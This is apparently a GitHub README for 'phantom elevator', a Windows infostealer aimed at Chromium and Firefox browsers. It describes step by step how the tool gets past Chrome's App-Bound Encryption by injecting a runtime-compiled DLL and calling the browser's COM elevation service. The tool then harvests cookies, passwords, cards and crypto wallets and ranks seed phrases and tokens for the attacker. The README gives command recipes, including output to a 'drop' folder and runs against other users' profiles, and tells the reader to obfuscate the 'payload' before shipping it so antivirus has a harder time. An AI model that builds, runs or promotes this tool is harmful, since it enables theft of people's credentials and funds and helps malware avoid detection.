<div align="center">

# 👻 phantom elevator

### Multi-Browser Credential Extraction · App-Bound Encryption Bypass

*Walk Chromium and Firefox profile stores, recover the plaintext, rank what matters.*

<br>

<a href="https://github.com/Hidden-Rhythm/abe-bypass">
  <img src="https://img.shields.io/badge/💻_Source-GitHub-18181b?style=for-the-badge&logo=github&logoColor=white" alt="GitHub Source">
</a>
<img src="https://img.shields.io/badge/🐍_Python-3.10%2B-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="Python 3.10+">
<img src="https://img.shields.io/badge/🪟_Windows-10%20%7C%2011-0078D6?style=for-the-badge&logo=windows11&logoColor=white" alt="Windows 10/11">
<img src="https://img.shields.io/badge/Version-1.0.0-52525b?style=for-the-badge" alt="Version 1.0.0">

<br>

<img src="https://img.shields.io/badge/🔓_ABE-Bypassed-e11d48?style=for-the-badge" alt="ABE Bypassed">
<img src="https://img.shields.io/badge/🌐_Browsers-13_Families-8a2be2?style=for-the-badge" alt="13 Browser Families">
<img src="https://img.shields.io/badge/📡_Filtering-Signal_First-0ea5e9?style=for-the-badge" alt="Signal First">

<br><br>

**DPAPI + V20 BYPASS** &nbsp;·&nbsp; **COM ELEVATION BRIDGE** &nbsp;·&nbsp; **RANKED OUTPUT**

<br>

[**🚀 Quickstart**](#quickstart) · [**🖥️ CLI**](#cli) · [**🌐 Browsers**](#browsers) · [**⚡ Bypass**](#bypass) · [**🛡️ Obfuscation**](#obfuscation) · [**⚠️ Limitations**](#limitations)

</div>

---

## 🎯 What Is Phantom Elevator?

**phantom elevator** is a Windows credential extractor built for the post-ABE era. It walks Chromium and Firefox profile directories, locates every encrypted secret store, and recovers the plaintext — including the **v20 App-Bound Encryption** keys that broke every legacy DPAPI-only extractor.

It is a single-file Python application. No service to install, no driver to sign, no agent to persist.

> 🎯 **The goal:** point it at a machine, let it detect what is installed, and read the output.

<br>

<table>
<tr>
<td width="33%" valign="top">

### 🎯 Detect
<img src="https://img.shields.io/badge/AUTO-DISCOVERY-8a2be2?style=flat-square" height="18">

<sub>Enumerates Chromium and Firefox families from standard install paths. Missing browsers are skipped, not fatal.</sub>

</td>
<td width="33%" valign="top">

### 🔓 Recover
<img src="https://img.shields.io/badge/DPAPI%20%2B%20ABE-e11d48?style=flat-square" height="18">

<sub>Resolves each browser's key store — <code>v10</code> via DPAPI, <code>v20</code> via an in-process elevation bridge compiled at runtime.</sub>

</td>
<td width="33%" valign="top">

### 📊 Rank
<img src="https://img.shields.io/badge/SIGNAL--FIRST-0ea5e9?style=flat-square" height="18">

<sub>Scores every local-storage entry before writing. Wallets, tokens, and seed phrases lead the output.</sub>

</td>
</tr>
</table>

---

<a id="chain"></a>
## 🔗 The Chain That Broke

For years, credential tooling relied on one chain:

```text
Local State  →  encrypted_key (v10)  →  CryptUnprotectData  →  AES-256-GCM  →  plaintext
```

That chain still works — for `v10`.

Chrome 127 introduced **App-Bound Encryption** 🔒. The master key is now sealed inside a COM elevation service that only the browser's own signed process is supposed to reach. DPAPI returns ciphertext. The old chain dead-ends.

---

<a id="bypass"></a>
## ⚡ The ABE Problem

<img src="https://img.shields.io/badge/STATUS-BYPASSED-22c55e?style=flat-square" height="20"> <img src="https://img.shields.io/badge/METHOD-COM%20%2B%20INJECTION-e11d48?style=flat-square" height="20">

Phantom Elevator adds the missing bridge.

```text
Local State  →  encrypted_key (v20)  →  elevation-service bridge  →  master key  →  AES-256-GCM  →  plaintext
```

<br>

<details open>
<summary><b>⚙️ The bypass, step by step</b></summary>

<br>

```text
phantom_elevator.py
        │
        ├─ 01. Parse Local State → os_crypt.encrypted_key
        │
        ├─ 02. Compile a tiny C DLL
        │        CLSID + IID + vtable offset for the target browser
        │
        ├─ 03. Launch chrome.exe --version in a sandboxed TEMP
        │
        ├─ 04. OpenProcess → VirtualAllocEx → WriteProcessMemory
        │        → CreateRemoteThread(LoadLibraryW)
        │
        ├─ 05. DLL: CoCreateInstance(ElevationService, CLSCTX_LOCAL_SERVER)
        │        → vtable decrypt slot
        │        → plaintext key written to temp file
        │
        └─ 06. Python reads the key → AES-256-GCM decrypts
                 🍪 cookies · 🔑 passwords · 💳 cards · 🎫 tokens
```

</details>

<br>

Each supported Chromium build ships its own `CLSID`, `IID_V1` / `IID_V2`, elevation service name, and vtable offset — all carried in the browser table. The DLL is compiled at runtime with MinGW-w64 `gcc` or MSVC `cl`. If no compiler is present, the ABE path disables itself and `v10` extraction continues.

---

<a id="browsers"></a>
## 🌐 Supported Browsers

<img src="https://img.shields.io/badge/CHROMIUM-8%20BUILDS-4285F4?style=flat-square" height="20"> <img src="https://img.shields.io/badge/FIREFOX-5%20BUILDS-FF7139?style=flat-square" height="20">

### 🔵 Chromium family

| | Browser | Key protection | ABE bridge |
|:---:|:---|:---|:---:|
| <img src="https://www.google.com/s2/favicons?domain=google.com&sz=64" height="18"> | **Google Chrome** | DPAPI + ABE | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=google.com&sz=64" height="18"> | Chrome Beta | DPAPI + ABE | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=brave.com&sz=64" height="18"> | **Brave** | DPAPI + ABE | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=microsoft.com&sz=64" height="18"> | Microsoft Edge | DPAPI + ABE | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=avast.com&sz=64" height="18"> | Avast Secure Browser | DPAPI + ABE | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=vivaldi.com&sz=64" height="18"> | Vivaldi | DPAPI | ➖ |
| <img src="https://www.google.com/s2/favicons?domain=chromium.org&sz=64" height="18"> | Chromium | DPAPI | ➖ |
| <img src="https://www.google.com/s2/favicons?domain=opera.com&sz=64" height="18"> | Opera | DPAPI | ➖ |

### 🦊 Firefox family

| | Browser | Key protection | Status |
|:---:|:---|:---|:---:|
| <img src="https://www.google.com/s2/favicons?domain=mozilla.org&sz=64" height="18"> | **Firefox** | NSS / `key4.db` | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=waterfox.net&sz=64" height="18"> | Waterfox | NSS / `key4.db` | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=librewolf.net&sz=64" height="18"> | LibreWolf | NSS / `key4.db` | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=floorp.app&sz=64" height="18"> | Floorp | NSS / `key4.db` | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=zen-browser.app&sz=64" height="18"> | Zen Browser | NSS / `key4.db` | ✅ |

<sub>💡 Installation is detected automatically from standard `%LocalAppData%` and `%ProgramFiles%` paths. Missing browsers are skipped, not fatal.</sub>

---

## 📦 Extraction Matrix

<img src="https://img.shields.io/badge/CATEGORIES-9-8a2be2?style=flat-square" height="20"> <img src="https://img.shields.io/badge/ALL-OPTIONAL-64748b?style=flat-square" height="20">

<table>
<tr>
<th></th>
<th align="left">Category</th>
<th align="left">Chromium source</th>
<th align="left">Firefox source</th>
</tr>
<tr><td>🍪</td><td><b>Cookies</b></td><td><code>Network/Cookies</code></td><td><code>cookies.sqlite</code></td></tr>
<tr><td>🔑</td><td><b>Passwords</b></td><td><code>Login Data</code></td><td><code>logins.json</code></td></tr>
<tr><td>📜</td><td>History</td><td><code>History</code></td><td><code>places.sqlite</code></td></tr>
<tr><td>📝</td><td>Autofill</td><td><code>Web Data</code></td><td><code>formhistory.sqlite</code></td></tr>
<tr><td>💳</td><td><b>Cards</b></td><td><code>Web Data</code></td><td>—</td></tr>
<tr><td>🗂️</td><td>Local Storage</td><td><code>Local Storage/leveldb</code></td><td><code>storage/default</code></td></tr>
<tr><td>🔖</td><td>Bookmarks</td><td><code>Bookmarks</code></td><td><code>places.sqlite</code></td></tr>
<tr><td>🧩</td><td>Extensions</td><td><code>Extensions/</code></td><td><code>extensions/</code></td></tr>
<tr><td>🪙</td><td><b>Crypto Wallets</b></td><td>extension storage</td><td>extension storage</td></tr>
</table>

<sub>Every category is optional. Run a single target or the full set.</sub>

---

<a id="signal"></a>
## 📡 Signal-First Filtering

<img src="https://img.shields.io/badge/SCORED-BEFORE%20WRITE-0ea5e9?style=flat-square" height="20"> <img src="https://img.shields.io/badge/RANKED-NOT%20DUMPED-22c55e?style=flat-square" height="20">

> A raw dump is noise. Phantom Elevator scores local-storage entries before it writes them — the output leads with what actually matters.

**🏦 High-value hosts** — wallets, exchanges, identity providers, developer platforms:

```text
MetaMask · Phantom · Coinbase · Binance · Kraken · OKX · KuCoin · Bybit
Uniswap · Aave · OpenSea · WalletConnect · Ledger · Trezor · Trust Wallet
accounts.google.com · login.microsoftonline.com · github.com · gitlab.com
Auth0 · Okta · Discord · Slack
```

**🔑 High-value keys** — `token` `jwt` `session` `auth` `api_key` `secret` `password` `private_key` `seed` `mnemonic` `wallet` `keystore` `signer` `phrase`

**💎 High-value values** — seed phrases · `0x` private keys · Bech32 `bc1…` addresses · base58 Bitcoin addresses

The result is a ranked set instead of a haystack.

---

<a id="quickstart"></a>
## 🚀 Getting Started

<img src="https://img.shields.io/badge/TIME-60%20SECONDS-22c55e?style=flat-square" height="20"> <img src="https://img.shields.io/badge/STEPS-3-8a2be2?style=flat-square" height="20">

### 📋 Requirements

- 🪟 Windows **10 / 11**, x64
- 🐍 Python **3.10 or later**
- 🔨 MinGW-w64 `gcc` or MSVC `cl` — optional; enables the ABE / v20 path
- 🌐 Network on first run, for dependency bootstrap

Dependencies resolve automatically on launch:

| Package | Purpose |
|:---|:---|
| `pycryptodome` | AES-256-GCM |
| `python-snappy` | LevelDB block decompression |
| `gcc` | attempted via `winget`, `choco`, then `scoop` |

If no compiler can be installed, the tool prints a warning and continues in `v10`-only mode.

### 1. Clone the Repository

```bash
git clone https://github.com/Hidden-Rhythm/abe-bypass.git
cd abe-bypass
```

### 2. Launch the Application

```bash
python phantom_elevator.py
```

### 3. Read the Output

```text
cookies.txt
passwords.tsv
local_storage.json
```

The tool prints a banner, detects installed browsers, bootstraps missing packages, compiles the ABE bridge when needed, and walks each profile. Progress is reported per browser and per category.

```bash
python phantom_elevator.py --help
```

<sub>📖 Full flag surface, recipes, and exit codes: <a href="#cli">CLI Reference</a>.</sub>

---

## 📂 Input & Output

Phantom Elevator discovers profile directories on its own. With `--profile` you can point it at a portable install, another user's profile, or a mounted disk.

**Example input**

```text
C:\Users\<name>\AppData\Local\Google\Chrome\User Data\Default\
```

**Default output**

```text
cookies.txt · passwords.tsv · local_storage.json · bookmarks.json
```

<br>

| Artifact | Format | Notes |
|:---|:---|:---|
| `cookies.txt` | Netscape | import-ready |
| `passwords.tsv` | TSV | `url · user · password` |
| `history.csv` | CSV | timestamped |
| `autofill.csv` | CSV | field / value |
| `cards.csv` | CSV | masked in console |
| `local_storage.json` | JSON | ranked by signal score |
| `bookmarks.json` | JSON | folder tree preserved |
| `extensions.json` | JSON | ID, name, version, path |

<sub>Outputs land beside the script unless an alternate path is supplied. Temporary injection artifacts are written to a per-run sandbox under `TEMP` and are not reused across runs.</sub>

---

<a id="cli"></a>
## 🖥️ Command Line

<img src="https://img.shields.io/badge/FLAGS-13-8a2be2?style=flat-square" height="20"> <img src="https://img.shields.io/badge/RECIPES-8-e11d48?style=flat-square" height="20"> <img src="https://img.shields.io/badge/EXIT%20CODES-6-0ea5e9?style=flat-square" height="20">

Every flag is optional. With no arguments, Phantom Elevator runs fully interactive: it detects browsers, prints the menu, and asks what to extract.

```bash
python phantom_elevator.py [OPTIONS]
```

<br>

### ⚙️ Options

<table>
<tr>
<th align="left">Flag</th>
<th align="left">Argument</th>
<th align="left">Default</th>
<th align="left">What it does</th>
</tr>
<tr>
<td><code>-h</code>, <code>--help</code></td>
<td>—</td>
<td>—</td>
<td>📖 Prints the full argument surface and exits.</td>
</tr>
<tr>
<td><code>-b</code>, <code>--browser</code></td>
<td><code>NAME</code></td>
<td><code>all</code></td>
<td>🌐 Restrict to one browser family. Accepts <code>chrome</code>, <code>brave</code>, <code>edge</code>, <code>avast</code>, <code>vivaldi</code>, <code>chromium</code>, <code>opera</code>, <code>firefox</code>, <code>waterfox</code>, <code>librewolf</code>, <code>floorp</code>, <code>zen</code>. Repeatable.</td>
</tr>
<tr>
<td><code>-c</code>, <code>--category</code></td>
<td><code>NAME</code></td>
<td><code>all</code></td>
<td>📦 Limit extraction to a category: <code>cookies</code>, <code>passwords</code>, <code>history</code>, <code>autofill</code>, <code>cards</code>, <code>storage</code>, <code>bookmarks</code>, <code>extensions</code>, <code>wallets</code>. Repeatable.</td>
</tr>
<tr>
<td><code>-o</code>, <code>--output</code></td>
<td><code>DIR</code></td>
<td>script directory</td>
<td>📁 Where artifacts are written. Created if missing.</td>
</tr>
<tr>
<td><code>--profile</code></td>
<td><code>PATH</code></td>
<td>auto-detected</td>
<td>🎯 Point at a specific profile directory instead of walking the standard install paths.</td>
</tr>
<tr>
<td><code>--no-abe</code></td>
<td>—</td>
<td>off</td>
<td>🔒 Skip the App-Bound Encryption bridge entirely. <code>v10</code> and Firefox extraction still run; <code>v20</code> stores are skipped instead of failing the run.</td>
</tr>
<tr>
<td><code>--no-bootstrap</code></td>
<td>—</td>
<td>off</td>
<td>📴 Do not auto-install missing dependencies or attempt a compiler fetch. Fails fast if <code>pycryptodome</code>, <code>python-snappy</code>, or <code>gcc</code> are absent.</td>
</tr>
<tr>
<td><code>--compiler</code></td>
<td><code>gcc</code> | <code>cl</code></td>
<td>auto</td>
<td>🔨 Force a specific toolchain for the ABE DLL instead of probing. <code>cl</code> needs a Visual Studio developer prompt.</td>
</tr>
<tr>
<td><code>--retries</code></td>
<td><code>N</code></td>
<td><code>5</code></td>
<td>🔁 Read attempts per locked SQLite / LevelDB file. Raise it when the target browser cannot be closed.</td>
</tr>
<tr>
<td><code>--min-signal</code></td>
<td><code>N</code></td>
<td><code>0</code></td>
<td>📡 Only write local-storage entries scoring at or above <code>N</code>. <code>0</code> keeps everything; <code>3</code> keeps wallets, tokens, and seed phrases only.</td>
</tr>
<tr>
<td><code>-f</code>, <code>--format</code></td>
<td><code>csv</code> | <code>json</code> | <code>netscape</code> | <code>tsv</code> | <code>all</code></td>
<td><code>all</code></td>
<td>🗄️ Output format for artifacts that support more than one.</td>
</tr>
<tr>
<td><code>-q</code>, <code>--quiet</code></td>
<td>—</td>
<td>off</td>
<td>🤫 Suppress the banner, progress lines, and console tables. Errors still print.</td>
</tr>
<tr>
<td><code>-v</code>, <code>--verbose</code></td>
<td>—</td>
<td>off</td>
<td>🔍 Log every key-recovery step: CLSID resolution, DLL compilation, injection result, decryption outcome.</td>
</tr>
<tr>
<td><code>--dry-run</code></td>
<td>—</td>
<td>off</td>
<td>🧪 Detect browsers, profiles, and key protection, then print the plan without decrypting or writing anything.</td>
</tr>
</table>

<br>

### 🧾 Recipes

**👻 Everything, everywhere, interactive**
```bash
python phantom_elevator.py
```

**🍪 Chrome cookies only, into a drop folder**
```bash
python phantom_elevator.py -b chrome -c cookies -o C:\Users\dj\Desktop\drop
```

**🔑 Credentials and wallets across every Chromium browser, no ABE**
```bash
python phantom_elevator.py -b chrome -b brave -b edge -c passwords -c wallets --no-abe
```

**💎 High-signal local storage only, JSON out**
```bash
python phantom_elevator.py -c storage --min-signal 3 -f json -q
```

**🧪 See what would happen before it happens**
```bash
python phantom_elevator.py --dry-run -v
```

**💾 Portable install on a mounted drive**
```bash
python phantom_elevator.py --profile "E:\PortableApps\FirefoxPortable\Data\profile"
```

**🔨 Force the MSVC toolchain in a dev prompt**
```bash
python phantom_elevator.py --compiler cl -v --retries 10
```

**📴 Fully offline machine, dependencies pre-staged**
```bash
python phantom_elevator.py --no-bootstrap --no-abe
```

<br>

### 🚦 Exit codes

| Code | Meaning |
|:---:|:---|
| `0` | ✅ Run completed. Artifacts written (or `--dry-run` plan printed). |
| `1` | 🔍 No supported browser or profile found. |
| `2` | 📦 Missing dependency with `--no-bootstrap` set. |
| `3` | 🔨 ABE requested, no compiler available, `--no-abe` not set. |
| `4` | 🔒 All target files locked past `--retries`. |
| `5` | 💥 Decryption failure — wrong key, corrupt store, or browser build newer than the table. |

<br>

<details>
<summary><b>🔧 When a new browser build breaks ABE</b></summary>

<br>

Run the failing browser through a single verbose dry pass:

```bash
python phantom_elevator.py -b chrome -c passwords -v --dry-run
```

The log prints the CLSID, `IID_V1` / `IID_V2`, elevation service name, and vtable offset the table resolved. If `--dry-run -v` reports a CLSID mismatch or an injection failure, those four values are the ones to update in the browser table — everything downstream reads from them. `IID_V2` support and the vtable slot are the two that shift most often between Chromium major releases.

</details>

---

<a id="obfuscation"></a>
## 🛡️ Hardening the Payload

<img src="https://img.shields.io/badge/PIPELINE-8%20STAGES-8a2be2?style=flat-square" height="20"> <img src="https://img.shields.io/badge/FINGERPRINT-SHA--256-22c55e?style=flat-square" height="20">

> **Obfuscate before you ship.** Phantom Elevator is a single-file Python application — a drop-in target for the [**Hidden-Rhythm obfuscator**](https://github.com/Hidden-Rhythm/obfuscator) pipeline.

```text
              ┌──────────────────────────┐
              │     01. Read Source      │
              └────────────┬─────────────┘
                           ▼
              ┌──────────────────────────┐
              │ 02. Encrypt Constants    │
              └────────────┬─────────────┘
                           ▼
              ┌──────────────────────────┐
              │    03. Build Payload     │
              └────────────┬─────────────┘
                           ▼
              ┌──────────────────────────┐
              │    04. Build Stage 2     │
              └────────────┬─────────────┘
                           ▼
              ┌──────────────────────────┐
              │   05. Build Bootstrap    │
              └────────────┬─────────────┘
                           ▼
              ┌──────────────────────────┐
              │    06. Emit Surface      │
              └────────────┬─────────────┘
                           ▼
              ┌──────────────────────────┐
              │    07. Verify Syntax     │
              └────────────┬─────────────┘
                           ▼
              ┌──────────────────────────┐
              │     08. Write Output     │
              └──────────────────────────┘
```

### ▶️ Run it

```bash
git clone https://github.com/Hidden-Rhythm/obfuscator.git
cd obfuscator
python -m pip install rich
python obfuscator.py
```

When prompted, provide the path to `phantom_elevator.py`. Accept the default output name, `phantom_elevator_obf.py`.

<br>

<table>
<tr>
<th align="left">Layer</th>
<th align="left">Effect</th>
</tr>
<tr><td>🌳 <b>AST transformation</b></td><td>restructures eligible syntax-tree nodes</td></tr>
<tr><td>🔐 <b>Constant encoding</b></td><td>XOR-encodes strings and byte constants</td></tr>
<tr><td>📦 <b>Payload serialization</b></td><td>compiles to a <code>marshal</code> code object</td></tr>
<tr><td>🗜️ <b>Compression</b></td><td><code>zlib</code> + base64 chunking</td></tr>
<tr><td>🚀 <b>Layered loader</b></td><td>bootstrap and runtime-loading stages</td></tr>
<tr><td>🎭 <b>Generated identifiers</b></td><td>breaks static symbol matching</td></tr>
<tr><td>✅ <b>Syntax verification</b></td><td>compiles the output before writing</td></tr>
</table>

<br>

> 💡 The generated payload uses `marshal`-serialized code objects, which are Python-version dependent. Build and run on the **same interpreter version**. The obfuscator's runtime environment checks can affect execution in unusual sandboxes — test the generated file before deploying it.

The obfuscator also reports a SHA-256 build fingerprint and per-stage timings, so every hardened build is traceable to its source.

---

## 🏗️ Architecture

<img src="https://img.shields.io/badge/MODULES-5-8a2be2?style=flat-square" height="20"> <img src="https://img.shields.io/badge/FOOTPRINT-1%20FILE-0ea5e9?style=flat-square" height="20">

```text
┌─────────────────────────────────────────────────────────────┐
│                     PHANTOM ELEVATOR                        │
│                   single-file Python app                    │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   Browser discovery                                         │
│        │                                                    │
│        ├── Chromium profiles ──┐                            │
│        └── Firefox profiles ───┤                            │
│                                ▼                            │
│                     Profile walker                          │
│                                │                            │
│              ┌─────────────────┼─────────────────┐          │
│              ▼                 ▼                 ▼          │
│          SQLite reader     LevelDB reader    NSS reader     │
│              │                 │                 │          │
│              └─────────────────┼─────────────────┘          │
│                                ▼                            │
│                     Key recovery layer                      │
│              ┌─────────────────┴─────────────────┐          │
│              ▼                                   ▼          │
│        DPAPI (v10)                        ABE bridge (v20)  │
│        CryptUnprotectData                 COM + DLL inject  │
│              └─────────────────┬─────────────────┘          │
│                                ▼                            │
│                     AES-256-GCM decrypt                     │
│                                │                            │
│                                ▼                            │
│              CSV · JSON · Netscape · TSV output             │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## 🔬 Technical Details

<img src="https://img.shields.io/badge/STACK-python%20%2B%20c-3776AB?style=flat-square" height="20"> <img src="https://img.shields.io/badge/CRYPTO-AES--256--GCM-22c55e?style=flat-square" height="20">

| Component | Implementation |
|---|---|
| 🐍 Language | Python 3.10+ |
| 🔧 ABE bridge | C (MinGW-w64 `gcc` / MSVC `cl`) |
| 🔓 Key unprotection | DPAPI `CryptUnprotectData` + AES-256-GCM |
| ⚡ ABE access | COM elevation service + DLL injection |
| 🎯 Injection primitives | `OpenProcess` · `VirtualAllocEx` · `WriteProcessMemory` · `CreateRemoteThread` |
| 🗄️ LevelDB parsing | `python-snappy` |
| 🔐 Crypto | `pycryptodome` |
| 🍪 Cookie serialization | Netscape |
| 🔑 Password serialization | TSV |
| 📊 Structured output | CSV · JSON |
| 🧾 Build fingerprint | SHA-256 (via obfuscator) |

### ⚠️ Compatibility & Limitations

- 🪟 **Windows only.** The ABE bridge and DPAPI calls are Win32-specific.
- 🔄 **ABE is per-build.** Chromium CLSIDs, IIDs, service names, and vtable offsets change across browser releases. The browser table in the script is the source of truth — update it when a target ships a new elevation service.
- 🔨 **Compiler required for v20.** Without `gcc` or `cl`, the ABE path is disabled. `v10` and Firefox extraction still run.
- 🔒 **Running browsers may lock stores.** SQLite and LevelDB files can be held open. Close the target browser for the cleanest read, or rely on the tool's retry logic (`DEFAULT_RETRIES = 5`).
- 🛡️ **Antivirus is expected to react.** DLL injection and credential access are high-signal behaviors. The obfuscator layer raises static-analysis cost; it does not make the runtime behavior invisible.
- 🧬 **Obfuscator output is version-bound.** Generate and execute on the same Python minor version.

Test generated output thoroughly before using it in a production workflow.

---

## 🗂️ Project Structure

```text
abe-bypass/
└── phantom_elevator.py
```

The entire application — browser tables, DPAPI layer, ABE compiler, injector, profile walkers, and output writers — lives in one file. No package tree, no build step, no external config.

---

## 🛠️ Built With

| Technology | Purpose |
|---|---|
| 🐍 Python | Core application and extraction pipeline |
| 🔐 DPAPI | `v10` key unprotection |
| ⚡ COM | Elevation-service access for `v20` |
| 📦 `pycryptodome` | AES-256-GCM decryption |
| 🗜️ `python-snappy` | LevelDB block decompression |
| 🎨 Rich | Terminal banner and progress display |

---

## 🔗 Links

<div align="center">

<a href="https://github.com/Hidden-Rhythm/abe-bypass">
  <img src="https://img.shields.io/badge/Repository-View%20Source-18181b?style=for-the-badge&logo=github&logoColor=white" alt="View Repository">
</a>

<a href="https://github.com/Hidden-Rhythm/obfuscator">
  <img src="https://img.shields.io/badge/Companion-obfuscator-52525b?style=for-the-badge&logo=github&logoColor=white" alt="Obfuscator">
</a>

<a href="https://github.com/Hidden-Rhythm">
  <img src="https://img.shields.io/badge/Developer-Hidden--Rhythm-52525b?style=for-the-badge&logo=github&logoColor=white" alt="Developer Profile">
</a>

<a href="https://discord.com/users/hidden_rhythm">
  <img src="https://img.shields.io/badge/Discord-hidden__rhythm-5865F2?style=for-the-badge&logo=discord&logoColor=white" alt="Discord">
</a>

</div>

---

<div align="center">

### 👻 Built with Python.

**Hidden-Rhythm**

<sub>phantom elevator · v1.0.0 · ABE bypass · 13 browser families</sub>

</div>
